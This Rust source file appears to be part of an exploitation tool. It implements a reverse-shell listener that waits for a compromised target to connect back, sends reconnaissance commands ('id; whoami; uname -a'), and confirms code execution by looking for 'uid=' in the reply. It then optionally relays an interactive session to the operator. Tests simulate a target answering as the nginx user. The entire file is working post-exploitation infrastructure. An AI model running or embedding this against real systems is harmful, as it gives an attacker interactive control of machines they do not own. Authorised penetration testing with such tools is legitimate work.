//! Reverse-shell listener and command-output verification for `--shell`.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::time::{Duration, Instant};

use anyhow::{bail, Result};

pub struct Listener {
    listener: TcpListener,
    pub port: u16,
}

impl Listener {
    pub fn start(port: u16) -> Result<Self> {
        let listener = TcpListener::bind(("0.0.0.0", port))
            .map_err(|error| anyhow::anyhow!("could not listen on 0.0.0.0:{port}: {error}"))?;
        listener.set_nonblocking(true)?;
        Ok(Self { listener, port })
    }

    pub fn accept(&self, timeout: Duration) -> Result<TcpStream> {
        let deadline = Instant::now() + timeout;
        while Instant::now() < deadline {
            match self.listener.accept() {
                Ok((stream, peer)) => {
                    stream.set_nonblocking(false)?;
                    eprintln!("  reverse shell connected from {peer}");
                    return Ok(stream);
                }
                Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(Duration::from_millis(100));
                }
                Err(error) => return Err(error.into()),
            }
        }
        bail!("no reverse-shell connection within {}s", timeout.as_secs())
    }
}

/// Send the verification commands and require `uid=` in the output.
pub fn verify(mut conn: TcpStream, interactive: bool, timeout: Duration) -> Result<String> {
    conn.set_read_timeout(Some(Duration::from_secs(2)))?;
    conn.set_write_timeout(Some(Duration::from_secs(2)))?;
    conn.write_all(b"id; whoami; date; uname -a; echo __OK__\n")?;
    conn.flush()?;
    let deadline = Instant::now() + timeout;
    let mut transcript = Vec::new();
    let mut buffer = [0u8; 4096];
    while Instant::now() < deadline {
        match conn.read(&mut buffer) {
            Ok(0) => break,
            Ok(count) => {
                transcript.extend_from_slice(&buffer[..count]);
                if transcript.windows(6).any(|window| window == b"__OK__") {
                    break;
                }
            }
            Err(error)
                if matches!(
                    error.kind(),
                    std::io::ErrorKind::TimedOut | std::io::ErrorKind::WouldBlock
                ) =>
            {
                continue;
            }
            Err(error) => return Err(error.into()),
        }
    }
    let text = String::from_utf8_lossy(&transcript).to_string();
    if !text.contains("uid=") {
        bail!("shell connected but produced no uid= line: {text:?}");
    }
    if interactive {
        relay(conn, timeout)?;
    }
    Ok(text)
}

/// Best-effort relay: stdin → socket, socket → stdout, until either side ends.
fn relay(mut conn: TcpStream, timeout: Duration) -> Result<()> {
    let mut reader = conn.try_clone()?;
    let writer_thread = std::thread::spawn(move || {
        let stdin = std::io::stdin();
        let mut line = String::new();
        loop {
            line.clear();
            match stdin.read_line(&mut line) {
                Ok(0) => break,
                Ok(_) => {
                    if conn.write_all(line.as_bytes()).is_err() {
                        break;
                    }
                    let _ = conn.flush();
                }
                Err(_) => break,
            }
        }
    });
    reader.set_read_timeout(Some(timeout))?;
    let mut buffer = [0u8; 4096];
    loop {
        match reader.read(&mut buffer) {
            Ok(0) => break,
            Ok(count) => {
                let _ = std::io::stdout().write_all(&buffer[..count]);
                let _ = std::io::stdout().flush();
            }
            Err(error)
                if matches!(
                    error.kind(),
                    std::io::ErrorKind::TimedOut | std::io::ErrorKind::WouldBlock
                ) => {}
            Err(_) => break,
        }
    }
    let _ = writer_thread;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn verifies_a_shell_with_uid_output() {
        let listener = Listener::start(0).unwrap();
        let port = listener.listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            let mut client = TcpStream::connect(("127.0.0.1", port)).unwrap();
            let mut command = [0u8; 64];
            let _ = client.read(&mut command);
            client.write_all(b"uid=101(nginx) gid=101(nginx)\nnginx\n__OK__\n").unwrap();
        });
        let conn = listener.accept(Duration::from_secs(5)).unwrap();
        let transcript = verify(conn, false, Duration::from_secs(5)).unwrap();
        assert!(transcript.contains("uid=101"));
    }

    #[test]
    fn rejects_a_silent_connection() {
        let listener = Listener::start(0).unwrap();
        let port = listener.listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            let _ = TcpStream::connect(("127.0.0.1", port));
            std::thread::sleep(Duration::from_secs(3));
        });
        let conn = listener.accept(Duration::from_secs(5)).unwrap();
        assert!(verify(conn, false, Duration::from_millis(500)).is_err());
    }
}
